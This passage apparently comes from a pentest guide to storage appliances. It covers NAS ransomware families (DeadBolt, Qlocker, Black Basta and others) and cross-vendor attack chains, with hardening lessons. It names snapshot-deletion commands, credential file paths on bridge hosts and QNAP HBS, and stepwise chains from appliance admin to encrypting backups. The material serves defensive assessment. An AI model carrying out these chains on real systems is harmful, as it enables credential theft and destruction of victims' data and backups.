- QNAP System Log entries showing `admin` login from non-LAN IP
- Snapshot deletion events (DeadBolt attempted to delete recent snapshots before encrypting)

**Why victims lost data even with snapshots**: DeadBolt's first action after admin login was to enumerate and delete recent snapshots via the QTS snapshot API. Only victims with **immutable** snapshots (Snapshot Retention enabled) retained recoverable copies. This is the canonical case for treating Snapshot Lock / WORM as a ransomware control, not just a compliance control.

**Lessons for engagements**:

- Test snapshot immutability as a finding: "Snapshots on QTS share X are deletable by admin"
- Test QuickConnect exposure (even if the customer believes the QNAP is internal-only)
- Test UPnP forwarding on the customer's edge router

### 11.2 eCh0raix (QNAP and Synology, 2019-2024)

**Family longevity**: First observed July 2019; active through 2024. The single longest-lived NAS ransomware family.

**Victim targeting**: eCh0raix is dual-target — the same binary checks the host environment and selects QTS or DSM as the encryption target.

**Initial access**:

- QNAP victims: weak SSH credentials on TCP 22 (QNAP's optional SSH service)
- Synology victims: weak DSM admin credentials on TCP 5000/5001

**Encryption behavior**:

- eCh0raix encrypts files smaller than 20 MB by default; larger files are skipped to avoid inducing IO load
- File extension `.encrypt` (early variants) or random 4-char extension (later variants)
- Ransom note `README_FOR_DECRYPT.txt`; RSA-2048-wrapped key, victim pays for private key

**Cross-vendor lesson**: eCh0raix demonstrated that NAS-targeting ransomware could be viable across multiple vendors with the same binary. This set the template for subsequent families (DeadBolt, Qlocker, HelloKitty-on-ESXi) to follow.

### 11.3 Qlocker (QNAP, April 2021)

**Initial access**: CVE-2021-28799 in the QTS HelpDesk app — a pre-auth remote code execution vulnerability that did NOT require admin credentials. The HelpDesk app was enabled by default on millions of QNAP devices.

**Encryption primitive**: Qlocker used `7z` to password-archive each file in place, then deleted the original. The file content was not encrypted with a custom algorithm — Qlocker relied on 7z's AES-256 with a per-victim password the attacker held.

**Why this was novel**:

- Qlocker used a legitimate compression tool (`7z`) as its encryption primitive, defeating EDR that looked for custom encryption binaries
- The 7z archive was a valid archive — but the password was only known to the attacker
- Recovery was impossible without the password, even with snapshots, because the original file was deleted (and 7z was a "rename" not a "new file" event)

**Lessons for engagements**:

- Test for the QTS HelpDesk app being enabled — even on patched firmware, it should be disabled if not used
- Treat "HelpDesk enabled" as a finding regardless of patch level
- The 7z-archive-as-encryption pattern has been copied by subsequent families; monitor for unexpected `7z` invocations on any storage appliance

### 11.4 HelloKitty on VMware ESXi (and storage) (February 2021 - 2024)

**Initial access**: HelloKitty originally targeted VMware ESXi (CVE-2021-21974 — OpenSLP heap overflow). In 2023-2024, the affiliate expanded to target the SAN arrays backing ESXi clusters.

**Storage-layer attack pattern**:

- HelloKitty compromises ESXi via OpenSLP
- From ESXi shell, enumerates every datastore (typically a VMFS volume on a NetApp, Dell EMC, or Pure LUN)
- For each datastore, encrypts every `.vmdk` file
- Because VMFS is a clustered filesystem shared across ESXi hosts, encrypting `.vmdk` files from one host affects every VM on the LUN

**Why storage-layer response was slow**:

- Storage teams monitored LUNs for mass-read (exfiltration) but not mass-write (encryption)
- VMFS has no per-file audit log by default; mass file rename on VMFS is invisible to the array's audit
- Snapshots on the LUN (NetApp LUN-level snapshots, Pure SafeMode) saved victims who had them; victims without snapshots lost all VMs

**Lessons**: Treat VMFS-backed LUNs as in-scope for engagement testing; verify SafeMode / SmartLock / Snapshot Lock on every VMFS LUN. Storage cannot be evaluated in isolation from the hypervisor.

### 11.5 Black Basta (multiple vendors, 2022-2024)

**Pattern**: Black Basta is a ransomware-as-a-service targeting NetApp ONTAP, Dell EMC PowerStore, and QNAP. Storage-layer pattern:

1. Compromise appliance admin via credential spray or exposed QuickConnect
2. Use the appliance's own API to enumerate every SMB share, NFS export, S3 bucket
3. Disable snapshots where possible (`snapshot delete`; QNAP Snapshot API; Pure `purevol snap delete-for-destroy`)
4. Mass-encrypt every share, export, bucket
5. Exfiltrate for double-extortion via the appliance's own cloud-sync credential (QNAP HBS, Synology Cloud Sync, NetApp FabricPool)

**Black Basta is the canonical case for the "appliance as ransomware launchpad" pattern**. Storage appliances must be treated as Tier-0 assets — equivalent to domain controllers — because their compromise enables mass impact across every workload they serve.

---

## 12. Cross-Vendor Attack Chains

Engagements rarely involve a single vendor. Real environments mix vendors — NetApp primary replicated to a Dell EMC Unity DR via SANcopy bridge, a Pure FlashArray alongside a QNAP backup target, a TrueNAS homelab shadowing production. The most common cross-vendor chains:

### 12.1 NetApp → DR-Site Dell EMC Unity via SANcopy Bridge

A SANcopy bridge is a small Linux host that reads NetApp snapshots via iSCSI and writes them to the DR-site Unity via FC. Chain: (1) attacker compromises NetApp ONTAP admin (any vector from §2); (2) extracts the bridge's iSCSI CHAP secret from NetApp's iSCSI config; (3) reads the bridge's Dell EMC Naviseccli credentials from `/etc/naviseccli.conf`; (4) authenticates to the DR Unity and reads every replicated LUN.

### 12.2 Pure Storage → QNAP Backup Target

Customers without native Pure-to-QNAP replication use a Linux rsync bridge. Chain: (1) attacker compromises the Pure admin (any vector from §5); (2) mounts the Linux bridge's LUN (the bridge host is multi-pathed to Pure and QNAP); (3) reads QNAP admin credentials from the bridge host's `/etc/fstab` (`credentials=/etc/qnap-creds`); (4) authenticates to the QNAP via SMB and encrypts every share — the customer's "backup" target.

### 12.3 QNAP → AWS S3 via Hybrid Backup Sync Cloud Creds

The most common QNAP-to-cloud chain: (1) attacker compromises QNAP admin (any vector from §6); (2) reads HBS cloud-sync credentials from `/share/CACHEDEV1_DATA/.@plugins/HybridBackupSync/config.db`; (3) uses AWS access keys to enumerate the customer's S3 buckets; (4) mass-encrypts every S3 object the keys can write. Observed in DeadBolt follow-on incidents where victims discovered their AWS S3 backups had also been encrypted because the QNAP HBS credential had write access to S3.

### 12.4 TrueNAS → ESXi via iSCSI

TrueNAS is a common iSCSI backend for homelab and mid-market ESXi. The chain:

1. Attacker compromises TrueNAS admin (any vector from §8)
2. Enumerates iSCSI LUNs via the TrueNAS REST API
3. Mounts a LUN (LUN masking permits any initiator in some TrueNAS configs)
4. Reads the VMFS volume directly, extracting VM disk images
5. From VM disk images, extracts AD credentials, SSH keys, and application secrets

---

## 13. References and Further Reading

Vendor PSIRT feeds (subscribe): NetApp (`security.netapp.com/advisory/`), Dell PSIRT (`www.dell.com/support/security`), Pure (`support.purestorage.com/security/advisories`), QNAP (`www.qnap.com/en/security-advisories`), Synology (`www.synology.com/en-global/security/advisory`), iXsystems (`www.truenas.com/docs/security/`).

CISA advisories: AA22-059A (DeadBolt), AA22-061A (eCh0raix), AA21-131A (DarkSide, with storage IOCs), Stop Ransomware — HelloKitty / VMware ESXi (Feb 2024 update).

Standards: SNIA Storage Security White Paper; NIST SP 800-209 Storage Security; ISO/IEC 27040. MITRE ATT&CK storage-relevant techniques: T1552, T1021, T1486, T1530, T1213, T1074. Community: GreyHatHacker blog, HackTricks Network Services Pentest, VulnDB / NVD CVE feeds. This guide is the vendor-specific companion to `storage-san-attack-playbook.md` — the playbook covers cross-vendor methodology and protocol-level primitives; this guide covers what each vendor's appliance does, its historical CVE chain, and the hardening steps your pentest report should recommend.
